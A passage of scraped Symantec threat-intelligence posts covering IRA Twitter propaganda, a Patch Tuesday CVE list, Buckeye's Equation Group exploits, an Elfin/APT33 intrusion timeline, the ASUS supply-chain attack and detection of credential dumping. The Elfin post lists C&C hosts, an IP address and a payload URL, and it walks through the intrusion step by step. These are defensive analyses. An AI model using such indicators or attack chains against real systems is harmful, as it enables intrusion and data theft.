    "content": "One of the main talking points of the 2016 U.S. presidential election campaign involved attempts to surreptitiously influence public opinion using social media campaigns. In the months after the election, it quickly became apparent that a sophisticated propaganda operation had been directed against American voters. Not surprisingly, news of these campaigns caused widespread public concern, prompting social media firms to launch investigations into whether their services had been misused. In October 2018, Twitterreleased a massive datasetof content posted on its service by the Internet Research Agency (IRA), a Russian company responsible for the largest propaganda campaign directed against the U.S. The datasetconsisted of 3,836 Twitter accounts and nearly 10 million tweets. These accounts had amassed almost 6.4 million followers and were following 3.2 million accounts. The sheer volume of data was enormous, more than 275 GB. The archive has proven to be a treasure trove of information on how the IRA’s propaganda campaign operated.  For example, prior to the release, many people assumed that its posts were focused on just one side of the political spectrum. Once the data was made public, it quickly became obvious that in order to achieve its goal, the campaign directed propaganda at both sides of the liberal/conservative political divide in the U.S., in particular the more disaffected elements of both camps. The main objective of the campaign instead appeared to be sowing discord by attempting to inflame opinions on both sides. This was not just confined to the online sphere. Several of the accounts were used to organize political rallies in the U.S. and some of the most influential accounts in the dataset were used to promote these events to the largest possible audience. However, believing that there is a lot to learn from this data beyond its messages and target audience, we decided to carry out some in-depth analysis of the archive to learn more about how this propaganda campaign worked. What we discovered was that this was not an ad-hoc response to political events in the U.S. Instead, the evidence points to a carefully planned and coordinated operation, with the groundwork often laid months in advance. While the tactics employed changed somewhat over time, the basic template for this operation remained the same, utilizing a small core of accounts to push out new content and a wider pool of automated accounts to amplify those messages. Along the way, we also came across some interesting bits of information, such as what appeared to be some rogue operators using monetized link-shortening services to make some money on the side. Once we started analyzing the data, it became apparent that the accounts could be divided into two main categories, which we called main accounts and auxiliary accounts. Each category had different characteristics and played a different role. Main accounts had at least 10,000 followers but followed substantially fewer accounts. They were primarily used to publish new tweets. Auxiliary accounts had less than 10,000 followers, but often followed more accounts than that. Their main purpose was to retweet messages from other accounts, although they were also used to publish original tweets. Not surprisingly, the majority of accounts were auxiliary accounts. We identified 123 main accounts and 3,713 auxiliary accounts within the dataset. Main accounts generally were ”fake news” outlets masquerading as regional news outlets, or pretending to be political parties or hashtag games—the popular Twitter game that involves people sharing anecdotes or jokes based on a single theme, such as #5WordsToRuinADate. Based on their creation date they were usually created individually or in small batches. The default language selected for main accounts was always either English or Russian. Auxiliary accounts usually pretended to be individuals, spreading the content created by the main accounts by retweeting it. These accounts were usually created in batches and sometimes hundreds of auxiliary accounts were created on the same day. For example, during May 2014, seven fake news accounts were set up by the agency, along with 514 auxiliary accounts. Many of the accounts were created long before they were used. The average time between account creation and first tweet was 177 days. The average length of time an account remained active was 429 days. Some of the Twitter accounts created by the attackers managed to be extraordinarily influential. The most retweeted account within the dataset was TEN_GOP. Created in November 2015, the account masqueraded as a group of Republicans in Tennessee. It appears to have been manually operated. In less than two years TEN_GOP managed to rack up nearly 150,000 followers. Despite only tweeting 10,794 times, the account garnered over 6 million retweets. Only a tiny fraction (1,850) of those retweets came from other accounts within the dataset. In other words, almost all of its retweets came from accounts outside the dataset, meaning many could have been real Twitter users. Due to the popularity of this account, the IRA created two backup accounts in case TEN_GOP should be discovered and shutdown—ELEVEN_GOP and realTEN_GOP—both of which have the same profile description: “This is our backup account in case anything happens to @TEN_GOP”. As has already been noted, the IRA’s campaign targeted both ends of the political spectrum in the U.S. and this is reflected in the breakdown of influential accounts. The top 20 most retweeted English-language accounts were split evenly between conservative and liberal messages. There is a similar split in themes in the breakdown of the most followed English language accounts. Thirty-five percent pretended to support conservative causes, while 30 percent pretended to back liberal causes. The remainder masqueraded as general or political news outlets. Most of the fake news accounts created by the agency pretended to be local news outlets, such as “New Orleans Online”, “El Paso Top News”, or “San Jose Daily”. The majority of these accounts were created between May and August of 2014, but lay dormant until January 2015, when most of them started tweeting. This suggests that the fake news element of the operation was planned well in advance. The vast majority (96 percent) of these fake news accounts were fully automated, using services to monitor blog activity and automatically push new blog posts to Twitter. Another two percent of these accounts queued tweets for publication at scheduled times. Most followed a broad pattern of activity, with activity trending upwards from the beginning of 2015 until the summer of 2016 when there was a sudden fall in activity. By August 2016, all but one fake news account had stopped tweeting. This is likely because the fake news accounts had been using a service known as Twitterfeed to feed their blogs to Twitter. During 2016, Twitterfeed announced that it would close by October of that year and the fake news accounts began to transition to an alternative service called Twibble. The drop off in activity during August 2016 could have been caused by technical problems during the changeover. By December the changeover was complete and the fake news accounts had resumed business as usual. Not surprisingly, a majority (55 percent) of the most prolific accounts were fake news accounts. However, a significant number of prolific accounts had their identities masked by Twitter because they had less than 5,000 followers. Most of these accounts acted as auxiliary accounts and were automated in the same manner as most of the fake news accounts. However, while fake news accounts were automated to publish original content, these other accounts were automated to retweet content. Some tweets within the dataset contained links to other content. The majority of links were shortened URLs, masking the final destination. To get a picture of which sites these tweets were linking to, we followed each shortened URL tweeted during 2016 to find out the ultimate link destination. The largest number of links led to other Twitter posts, some of which were to other suspended accounts. Aside from Twitter, other social media services such as YouTube, Instagram, and Facebook also figured highly in the list of websites being linked to. The rest of the list was mostly filled out by links to legitimate media outlets. This suggests that, along with delivering “fake news” the campaign also leveraged real news stories that supported messages it was pushing. During the months prior to the 2016 U.S. presidential election, there was a marked increase in activity. Between January and November 2016, accounts within the dataset sent 771,954 English language tweets, with a marked uptick in activity as November approached. Analysis of the topics tweeted by English language accounts during this time period reveals that content was heavily focused on the election and quite evenly split between topics relating to either side of the political spectrum in the U.S. Perhaps the most overt aspect of the propaganda campaign was the IRA’s organization of a number of political rallies in the U.S. Despite the fact that the accounts comprised of fake personas and organizations, they nevertheless succeeded in mobilizing people to attend events. Besides its online activities, the campaign’s operators also organized rallies supporting positions on both sides of the political spectrum. One account, @March_for_Trump, advertised more events than any other account in the dataset, promoting events 47 times. Most of the other accounts involved in promoting rallies are anonymized as they have less than 5,000 followers. Only nine accounts in the dataset retweeted March_for_Trump’s tweets promoting rallies, but the majority of these retweets came from the most followed or retweeted accounts in the dataset, suggesting the campaign’s operators had prioritized promoting these events. While this propaganda campaign has often been referred to as the work of trolls, the release of the dataset makes it obvious that it was far more than that. It was planned months in advance and the operators had the resources to create and manage a vast disinformation network. It was a highly professional campaign. Aside from the sheer volume of tweets generated over a period of years, its orchestrators developed a streamlined operation that automated the publication of new content and leveraged a network of auxiliary accounts to amplify its impact. The sheer scale and impact of this propaganda campaign is obviously of deep concern to voters in all countries, who may fear a repeat of what happened in the lead-up to the U.S. presidential election in 2016. A growing awareness of the disinformation campaigns may help blunt their impact in future. If you’re concerned about falling victim to similar campaigns, read our blog postHow to Spot a Twitter Bot, which can be found on Symantec’sElection Security blog. Gillian is a software engineer working for Symantec's Security Technology and Response (STAR) team. She analyses emerging threat trends and develops tools for use within the department. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/twitterbots-propaganda-disinformation"
  },
  {
    "title": "microsoft patch tuesday may 2019",
    "content": "As always, customers are advised to follow these security best practices: IMPORTANT: Due to the severity of CVE-2019-0708, and the high likelihood of exploitation, Symantec recommends that customers apply patches immediately. If immediate patching is not possible, customers should take the following steps: UPDATE 05-22-2019: Symantec has released the following IPS signatures to detect and block attempts to exploit CVE-2019-0708: Microsoft's summary of the May 2019 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Scripting Engine Memory Corruption Vulnerability(CVE-2019-0911)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0912)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0913)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0914)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0915)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0916)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0917)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0918)MS Rating: Critical Internet Explorer Spoofing Vulnerability(CVE-2019-0921)MS Rating: Important Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0922)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0923)MS Rating: Important Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0924)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0925)MS Rating: Critical Microsoft Edge Memory Corruption Vulnerability(CVE-2019-0926)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0927)MS Rating: Critical Internet Explorer Memory Corruption Vulnerability(CVE-2019-0929)MS Rating: Critical Internet Explorer Information Disclosure Vulnerability(CVE-2019-0930)MS Rating: Important Scripting Engine Memory Corruption Vulnerability(CVE-2019-0884)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0937)MS Rating: Critical Microsoft Edge Privilege Escalation Vulnerability(CVE-2019-0938)MS Rating: Important Microsoft Browser Memory Corruption Vulnerability(CVE-2019-0940)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0933)MS Rating: Critical Internet Explorer Security Bypass Vulnerability(CVE-2019-0995)MS Rating: Important Cumulative Security Update for Microsoft Office Microsoft Office Access Connectivity Engine Remote Code Execution Vulnerability(CVE-2019-0945)MS Rating: Important Microsoft Office Access Connectivity Engine Remote Code Execution Vulnerability(CVE-2019-0946)MS Rating: Important Microsoft Office Access Connectivity Engine Remote Code Execution Vulnerability(CVE-2019-0947)MS Rating: Important Microsoft SharePoint Spoofing Vulnerability(CVE-2019-0949)MS Rating: Important Microsoft SharePoint Spoofing Vulnerability(CVE-2019-0950)MS Rating: Important Microsoft SharePoint Spoofing Vulnerability(CVE-2019-0951)MS Rating: Important Microsoft SharePoint Server Remote Code Execution Vulnerability(CVE-2019-0952)MS Rating: Important Microsoft Word Remote Code Execution Vulnerability(CVE-2019-0953)MS Rating: Critical Microsoft SharePoint Server Information Disclosure Vulnerability(CVE-2019-0956)MS Rating: Important Microsoft SharePoint Privilege Escalation Vulnerability(CVE-2019-0957)MS Rating: Important Microsoft SharePoint Privilege Escalation Vulnerability(CVE-2019-0958)MS Rating: Important Microsoft Office SharePoint XSS Vulnerability(CVE-2019-0963)MS Rating: Important Cumulative Security Update for Microsoft .NET .NET Framework and .NET Core Denial of Service Vulnerability(CVE-2019-0820)MS Rating: Important .NET Framework Denial of Service Vulnerability(CVE-2019-0864)MS Rating: Important ASP.NET Core Denial of Service Vulnerability(CVE-2019-0980)MS Rating: Important ASP.NET Core Denial of Service Vulnerability(CVE-2019-0981)MS Rating: Important ASP.NET Denial of Service Vulnerability(CVE-2019-0982)MS Rating: Important NuGet Package Manager Tampering Vulnerability(CVE-2019-0976)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Windows Kernel Privilege Escalation Vulnerability(CVE-2019-0881)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2019-0892)MS Rating: Important Cumulative Security Update for Microsoft Windows Windows DHCP Server Remote Code Execution Vulnerability(CVE-2019-0725)MS Rating: Critical Windows NDIS Privilege Escalation Vulnerability(CVE-2019-0707)MS Rating: Important Diagnostic Hub Standard Collector,Visual Studio Standard Collector Privilege Escalation Vulnerability(CVE-2019-0727)MS Rating: Important Windows Defender Application Control Security Bypass Vulnerability(CVE-2019-0733)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2019-0734)MS Rating: Important Microsoft SQL Server Analysis Services Information Disclosure Vulnerability(CVE-2019-0819)MS Rating: Important Windows Error Reporting Privilege Escalation Vulnerability(CVE-2019-0863)MS Rating: Important Windows OLE Remote Code Execution Vulnerability(CVE-2019-0885)MS Rating: Important Windows Hyper-V Information Disclosure Vulnerability(CVE-2019-0886)MS Rating: Important Windows Storage Service Privilege Escalation Vulnerability(CVE-2019-0931)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2019-0936)MS Rating: Important Unified Write Filter Privilege Escalation Vulnerability(CVE-2019-0942)MS Rating: Important Microsoft Dynamics On-Premise Security Bypass Vulnerability(CVE-2019-1008)MS Rating: Important Security Update for Microsoft Remote Desktop Services Remote Desktop Services Remote Code Execution Vulnerability(CVE-2019-0708)MS Rating: Critical Security Update for Windows Graphics Device Interface (GDI) GDI+ Remote Code Execution Vulnerability(CVE-2019-0903)MS Rating: Critical Windows GDI Information Disclosure Vulnerability(CVE-2019-0758)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-0882)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-0961)MS Rating: Important Security Update for Skype for Android Skype for Android Information Disclosure Vulnerability(CVE-2019-0932)MS Rating: Important Security Update for Jet Database Engine Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0889)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0890)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0891)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0893)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0894)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0895)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0896)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0897)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0898)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0899)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0900)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0901)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0902)MS Rating: Important Security Update for Azure and Team Foundation Server Azure DevOps Server and Team Foundation Server Cross-site Scripting Vulnerability(CVE-2019-0872)MS Rating: Important Microsoft Azure AD Connect Privilege Escalation Vulnerability(CVE-2019-1000)MS Rating: Important Azure DevOps Server and Team Foundation Server Information Disclosure Vulnerability(CVE-2019-0971)MS Rating: Important Azure DevOps Server and Team Foundation Server Cross-site Scripting Vulnerability(CVE-2019-0979)MS Rating: Important More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Ratheesh is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-may-2019"
  },
  {
    "title": "buckeye windows zero day exploit",
    "content": "The 2017 leak of Equation Group tools by a mysterious group calling itself the Shadow Brokers was one of the most significant cyber security stories in recent years. Equation isregarded as one of the most technically adept espionage groupsand the release of a trove of its tools had a major impact, with many attackers rushing to deploy the malware and exploits disclosed. One of these tools, the EternalBlue exploit, was used to devastating effect in theMay 2017 WannaCry ransomware outbreak. However, Symantec has now found evidence that the Buckeye cyber espionage group (aka APT3, Gothic Panda)began using Equation Group tools in attacks at least a year prior to the Shadow Brokers leak. Beginning in March 2016, Buckeye began using a variant of DoublePulsar (Backdoor.Doublepulsar), a backdoor that was subsequently released by the Shadow Brokers in 2017. DoublePulsar was delivered to victims using a custom exploit tool (Trojan.Bemstour) that was specifically designed to install DoublePulsar. Bemstour exploits two Windows vulnerabilities in order to achieve remote kernel code execution on targeted computers. One vulnerability is a Windows zero-day vulnerability (CVE-2019-0703) discovered by Symantec. The second Windows vulnerability (CVE-2017-0143) was patched in March 2017 after it was discovered to have been used by two exploit tools—EternalRomance and EternalSynergy—that were also released as part of the Shadow Brokers leak. The zero-day vulnerability allows for the leaking of information and can be exploited in conjunction with other vulnerabilities to attain remote kernel code execution. It was reported by Symantec to Microsoft in September 2018 andwas patched on March 12, 2019. How Buckeye obtained Equation Group tools at least a year prior to the Shadow Brokers leak remains unknown. Buckeye disappeared in mid-2017 and three alleged members of the group wereindicted in the U.S.in November 2017. However, while activity involving known Buckeye tools ceased in mid-2017, the Bemstour exploit tool and the DoublePulsar variant used by Buckeye continued to be used until at least September 2018 in conjunction with different malware. The Buckeye attack group had been active since at least 2009, when it began mounting a string of espionage attacks, mainly against organizations based in the U.S. The group has a record of exploiting zero-day vulnerabilities. These includeCVE-2010-3962as part of an attack campaign in 2010 andCVE-2014-1776in 2014. Although other zero-day attacks have been reported, they have not been confirmed by Symantec. All zero-day exploits known, or suspected, to have been used by this group are for vulnerabilities in Internet Explorer and Flash. Beginning in August 2016, a group calling itself the Shadow Brokers began releasing tools it claimed to have originated from the Equation Group. It initially released samples of the information it had, offering the full trove to the highest bidder. Over the coming months, it progressively released more tools, until April 2017, when it released a final, large cache of tools, including the DoublePulsar backdoor, the FuzzBunch framework, and the EternalBlue, EternalSynergy, and EternalRomance exploit tools. However, Buckeye had already been using some of these leaked tools at least a year beforehand. The earliest known use of Equation Group tools by Buckeye is March 31, 2016, during an attack on a target in Hong Kong. During this attack, the Bemstour exploit tool was delivered to victims via known Buckeye malware (Backdoor.Pirpi). One hour later, Bemstour was used against an educational institution in Belgium. Bemstour is specifically designed to deliver a variant of the DoublePulsar backdoor. DoublePulsar is then used to inject a secondary payload, which runs in memory only. The secondary payload enables the attackers to access the affected computer even after DoublePulsar is removed. It is worth noting that earlier versions did not include any means of uninstalling the DoublePulsar implant. This functionality was added in later versions. A significantly improved variant of the Bemstour exploit tool was rolled out in September 2016, when it was used in an attack against an educational institution in Hong Kong. While the original variant was only capable of exploiting 32-bit systems, the new variant could exploit both 32-bit and 64-bit targets, adding support for newer Windows versions. Another new feature of the payload in the second variant allowed the attacker to execute arbitrary shell commands on the infected computer. This custom payload is also designed to copy arbitrary files and execute arbitrary processes on the targeted computer. When used against 32-bit targets, Bemstour still delivered the same DoublePulsar backdoor. However, against 64-bit targets it delivered only the custom payload. The attackers typically used it to execute shell commands that created new user accounts. Bemstour was used again in June 2017 in an attack against an organization in Luxembourg. Unlike earlier attacks when Bemstour was delivered using Buckeye’s Pirpi backdoor, in this attack Bemstour was delivered to the victim by a different backdoor Trojan (Backdoor.Filensfer). Between June and September 2017, Bemstour was also used against targets in the Philippines and Vietnam. Development of Bemstour has continued into 2019. The most recent sample of Bemstour seen by Symantec appears to have been compiled on March 23, 2019, eleven days after the zero-day vulnerability was patched by Microsoft. The purpose of all the attacks was to acquire a persistent presence on the victim’s network, meaning information theft was the most likely motive of the attacks. Filensfer is a family of malware that has been used in targeted attacks since at least 2013. Symantec has found multiple versions of the malware, including a C++ version, a compiled Python version (using py2exe), and a PowerShell version. Over the past three years, Filensfer has been deployed against organizations in Luxembourg, Sweden, Italy, the UK, and the U.S. Targets included organizations in the telecoms, media, and manufacturing sectors. While Symantec has never observed the use of Filensfer alongside any known Buckeye tools, information shared privately by another vendor included evidence of Filensfer being used in conjunction with known Buckeye malware (Backdoor.Pirpi). Bemstour exploits two Windows vulnerabilities in order to achieve remote kernel code execution on targeted computers. The zero-day vulnerability found and reported by Symantec (CVE-2019-0703) occurs due to the way the Windows SMB Server handles certain requests. The vulnerability allows for the leaking of information. The second vulnerability (CVE-2017-0143) is a message type confusion vulnerability. When the two vulnerabilities are exploited together, the attacker can gain full access in the form of kernel mode code execution, enabling them to deliver malware to the targeted computer. When Bemstour was first used in 2016, both vulnerabilities were zero days, although CVE-2017-0143 was subsequently patched by Microsoft in March 2017 (MS17-010). CVE-2017-0143 was also used by two other exploit tools—EternalRomance and EternalSynergy—that were released as part of the Shadow Brokers leak in April 2017. Buckeye's exploit tool, EternalRomance, as well as EternalSynergy, can exploit the CVE-2017-0143 message type confusion vulnerability to perform memory corruption on unpatched victim computers. In order to obtain remote code execution capabilities, all three exploit tools needed to collect information about the memory layout of attacked systems in addition to exploiting the aforementioned message type confusion vulnerability. Each tool performed this differently, relying on different vulnerabilities. In the case of the Buckeye exploit tool, the attackers exploited their own zero-day vulnerability (CVE-2019-0703). The variant of DoublePulsar used in the first attacks performed by Buckeye was different to that leaked by the Shadow Brokers. It appears to contain code to target newer versions of Windows (Windows 8.1 and Windows Server 2012 R2), indicating that it is a newer version of the malware. It also includes an additional layer of obfuscation. Based on technical features and timing, it is possible that this obfuscation was created by DoublePulsar's original authors. It is noteworthy that the attackers never used the FuzzBunch framework in its attacks. FuzzBunch is a framework designed to manage DoublePulsar and other Equation Group tools and was leaked by the Shadow Brokers in 2017. This suggests that Buckeye only managed to gain access to a limited number of Equation Group tools. There are multiple possibilities as to how Buckeye obtained Equation Group tools before the Shadow Brokers leak. Based on the timing of the attacks and the features of the tools and how they are constructed, one possibility is that Buckeye may have engineered its own version of the tools from artifacts found in captured network traffic, possibly from observing an Equation Group attack. Other less supported scenarios, given the technical evidence available, include Buckeye obtaining the tools by gaining access to an unsecured or poorly secured Equation Group server, or that a rogue Equation group member or associate leaked the tools to Buckeye. Mystery also surrounds the continued use of the exploit tool and DoublePulsar after Buckeye's apparent disappearance. It may suggest that Buckeye retooled following its exposure in 2017, abandoning all tools publicly associated with the group. However, aside from the continued use of the tools, Symantec has found no other evidence suggesting Buckeye has retooled. Another possibility is that Buckeye passed on some of its tools to an associated group. Symantec has the following protection in place to protect customers against these attacks: File-based protection Network-based protection (Intrusion Prevention System) In addition to file-based protection, customers of theDeepSight Intelligence Managed Adversary and Threat Intelligence(MATI) service have received reports on Buckeye, which detail methods of detecting and thwarting activities of this group. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/buckeye-windows-zero-day-exploit"
  },
  {
    "title": "elfin apt33 espionage",
    "content": "The Elfin espionage group (aka APT33) has remained highly active over the past three years, attacking at least 50 organizations in Saudi Arabia, the United States, and a range of other countries. The group, which first became active in late 2015 or early 2016, specializes in scanning for vulnerable websites and using this to identify potential targets, either for attacks or creation of command and control (C&C) infrastructure. It has compromised a wide range of targets, including governments along with organizations in the research, chemical, engineering, manufacturing, consulting, finance, telecoms, and several other sectors. Elfin continues to be focused heavily on Saudi Arabia, which accounted for 42 percent of attacks observed by Symantec since the beginning of 2016. However, the U.S. has also been a country of significant interest to the group, with 18 organizations attacked over the past three years, including a number of Fortune 500 companies. Elfin targets in the U.S. have included organizations in the engineering, chemical, research, energy consultancy, finance, IT, and healthcare sectors. Some of these U.S. organizations may have been targeted by Elfin for the purpose of mounting supply chain attacks. In one instance, a large U.S. company was attacked in the same month a Middle Eastern company it co-owns was also compromised. In a recent wave of attacks during February 2019, Elfin attempted to exploit a known vulnerability (CVE-2018-20250) in WinRAR, the widely used file archiving and compression utility capable of creating self-extracting archive files. The exploit was used against one target in the chemical sector in Saudi Arabia. If successfully exploited on an unpatched computer, the vulnerability could permit an attacker to install any file on the computer, which effectively permits code execution on the targeted computer. Two users in the targeted organization received a file called \"JobDetails.rar\", which attempted to exploit the WinRAR vulnerability. This file was likely delivered via a spear-phishing email. However, prior to this attempted attack, Symantec had rolled out proactive protection against any attempt to exploit this vulnerability (Exp.CVE-2018-20250). This protection successfully protected the targeted organization from being compromised. Elfin came under the spotlight in December 2018 when it was linked with a new wave of Shamoon attacks. One Shamoon victim in Saudi Arabia had recently also been attacked by Elfin and had been infected with the Stonedrill malware (Trojan.Stonedrill) used by Elfin. Because the Elfin and the Shamoon attacks against this organization occurred so close together, there has been speculation that the two groups may be linked. However, Symantec has found no further evidence to suggest Elfin was responsible for these Shamoon attacks to date.  We continue to monitor the activities of both groups closely. Elfin has deployed a wide range of tools in its attacks including custom malware, commodity malware, and open-source hacking tools. Custom malware used by the group include: In addition to its custom malware, Elfin has also used a number of commodity malware tools, available for purchase on the cyber underground. These include: Elfin also makes frequent use of a number of publicly available hacking tools, including: In this section, we describe in detail an Elfin attack on a U.S. organization. On February 12, 2018 at 16:45 (all times are in the organization’s local time), an email was sent to the organization advertising a job vacancy at an American global service provider. The email contained a malicious link to hxxp://mynetwork.ddns[DOT].net:880. The recipient clicked the link and proceeded to download and open a malicious HTML executable file, which in turn loaded content from a C&C server via an embedded iframe. At the same time, code embedded within this file also executed a PowerShell command to download and execute a copy of chfeeds.vbe from the C&C server. A second JavaScript command was also executed, which created a scheduled task to execute chfeeds.vbe multiple times a day. The chfeeds.vbe file acts as a downloader and was used to download a second PowerShell script (registry.ps1). This script in turn downloaded and executed a PowerShell backdoor known as POSHC2, a proxy-aware C&C framework, from the C&C server (hxxps:// host-manager.hopto.org). Later at 20:57, the attackers became active on the compromised machine and proceeded to download the archiving tool WinRAR. At 23:29, the attackers then proceeded to deploy an updated version of their POSHC2 stager. This tool was downloaded several times between 23:29 on February 12 and 07:47 on February 13. Two days later, on February 14 at 15:12, the attackers returned and installed Quasar RAT onto the infected computer that communicated with a C&C server (217.147.168.123). Quasar RAT was installed to CSIDL_PROFILE\\appdata\\roaming\\microsoft\\crypto\\smss.exe. At this point, the attackers ceased activity while maintaining access to the network until February 21. At 06:38, the attackers were observed downloading a custom .NET FTP tool to the infected computer. Later at 6:56, the attackers exfiltrated data using this FTP tool to a remote host: Activity ceased until the attackers returned on March 5 and were observed using Quasar RAT to download a second custom AutoIt FTP exfiltration tool known as FastUploader from hxxp://192.119.15[DOT]36:880/ftp.exe. This tool was then installed to csidl_profile\\appdata\\roaming\\adobe\\ftp.exe. FastUploader is a custom FTP tool designed to exfiltrate data at a faster rate than traditional FTP clients. At this point, additional activity from the attackers continued between March 5 into April, and on April 18 at 11:50, a second remote access tool known as DarkComet was deployed to csidl_profile\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup\\smss.exe on the infected computer. This was quickly followed 15 seconds later by the installation of a credential dumping to csidl_profile\\appdata\\roaming\\microsoft\\credentials\\dwm32.exe, and the execution of PowerShell commands via PowerShell Empire, a freely available post-exploitation framework, to bypass logging on the infected machine. Activity continued throughout April where additional versions of DarkComet, POSHC2 implants, and an AutoIt backdoor were deployed along with further credential dumping activities. Elfin is one of the most active groups currently operating in the Middle East, targeting a large number of organizations across a diverse range of sectors. Over the past three years, the group has utilized a wide array of tools against its victims, ranging from custom built malware to off-the-shelf RATs, indicating a willingness to continually revise its tactics and find whatever tools it takes to compromise its next set of victims. Symantec has the following protection in place to protect customers against these attacks: File-based protection In addition to file-based protection, customers of theDeepSight Intelligence Managed Adversary and Threat Intelligence(MATI) service have received reports on Elfin, which detail methods of detecting and thwarting activities of this group. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/elfin-apt33-espionage"
  },
  {
    "title": "asus supply chain attack",
    "content": "News has emerged that tech company ASUS has been delivering malware through its automated software update system. Based on our analysis, this supply chain attack started in June 2018 and continued through to at least late October. It may have affected up to half a million systems. The Trojanized updates contained a form of backdoor program which attempted to connect to an attacker-controlled domain. The updates were signed with legitimate ASUS digital certificates. Symantec detects the Trojanized updates asTrojan.Susafone,Trojan.Susafone!gen1,Trojan.Susafone!gen2, andTrojan.Susafone!gen3. What happens when the Trojanized updates are installed? The Trojanized updates search for specific machines based on their unique MAC addresses. If specific MAC addresses are found, the installed updates attempt to connect to asushotfix[.]com. This domain is currently offline. How many victims are there? Symantec telemetry shows that at least 13,000 computers received the Trojanized updates. 80 percent of victims were consumers and 20 percent were from organizations. Our telemetry shows an even spread of victims across the globe. What is the motivation behind the attack? The attacker motivation is unclear at this time. Who are the attackers behind this attack? This is unknown at this time. What is a supply chain attack? Supply chain attacks attempt to exploit third-party services and software to compromise a final target. Hijacked software updates are one of the most common forms of supply chain attack. Similar campaigns in the past include the CCleaner attacks and the Petya campaign. Symantec noted in itslatest ISTR reporthow supply chain attacks increased by 78 percent in 2018. Thanks to Kaspersky for sharing details related to these attacks. Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/asus-supply-chain-attack"
  },
  {
    "title": "detecting credential dumping",
    "content": "There are various steps that an attacker must follow in order to execute any successful attack, with the initial compromise being just one stage in the overall attack chain. Once attackers have successfully breached the perimeter of an organization, they enter into the lateral movement phase where they attempt to tiptoe through a network, identifying the systems and data that are the ultimate target of their campaign. Credential dumping is a technique frequently used by attackers during lateral movement to obtain account information, such as logins and passwords. Armed with this information, the attackers can then spread further within an organization and/or access restricted data. Attackers use a variety of different credential-dumping methods that require first obtaining administrator privileges. This process is known as privilege escalation and it must be performed before any attempts at credential dumping. Detecting and blocking lateral movement activity is an important part of any organization's defense strategy and our Symantec portfolio provides defense-in-depth across control points. Our solutions detect and prevent credential dumping, and also protect against precursor events such as threat delivery and privilege escalation, as well as post-theft credential use. Credential dumping has long been used as a step in post-breach lateral movement and is listed asT1003 in the MITRE ATT&CK™ Framework. One of the challenges in protecting against all forms of credential dumping is that attackers attempt to masquerade their methods as legitimate activity, sometimes leveraging standard administrative tools to achieve the dumping. There are also easily available tools online, such asHacktool.Mimikatz, which use a variety of methods to dump credentials. Attempts at credential dumping can be uncovered in a variety of ways by our Symantec solutions. Here, I will discuss how our Symantec Endpoint Detection and Response (SEDR) product provides visibility into attempted credential theft by identifying a wide range of credential-dumping techniques, including: When any suspected credential theft is found, regardless of the specific tool used to access the credentials, SEDR reports exactly what was observed along with the relevant MITRE ATT&CK tactic (the attacker's goal) and technique (how the attacker was trying to achieve that goal): Symantec EDR will automatically pull in related activity to the credential dumping detection, in order to provide more context around the breach. SEDR leverages our Targeted Attack Analytics (TAA) technology, which combines the capabilities of our world-leading security experts with advanced artificial intelligence and machine learning to provide organizations with their own \"virtual 